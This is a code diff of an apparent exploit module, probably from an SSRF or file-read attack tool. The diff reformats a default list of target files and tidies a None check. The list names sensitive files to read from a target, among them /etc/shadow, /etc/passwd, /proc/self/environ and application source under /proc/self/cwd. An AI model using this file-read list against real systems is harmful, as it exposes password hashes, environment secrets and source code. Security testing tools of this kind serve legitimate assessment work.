@@ -12,12 +12,24 @@ class exploit():
     
     def __init__(self, requester, args):
         logging.info(f"Module '{name}' launched !")
-        self.files = args.targetfiles.split(',') if args.targetfiles != None else ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]   
+        self.files = args.targetfiles.split(',') if args.targetfiles != None else [
+            "/etc/passwd", 
+            "/etc/lsb-release", 
+            "/etc/shadow", 
+            "/etc/hosts", 
+            "\/\/etc/passwd", 
+            "/proc/self/environ", 
+            "/proc/self/cmdline", 
+            "/proc/self/cwd/index.php", 
+            "/proc/self/cwd/application.py", 
+            "/proc/self/cwd/main.py", 
+            "/proc/self/exe"
+        ]   
         self.file_magic = {'elf' : bytes([0x7f, 0x45, 0x4c, 0x46])}
         
         r = requester.do_request(args.param, "")
         
-        if r != None:
+        if r is not None:
             default = r.text
 
             # Create directory to store files
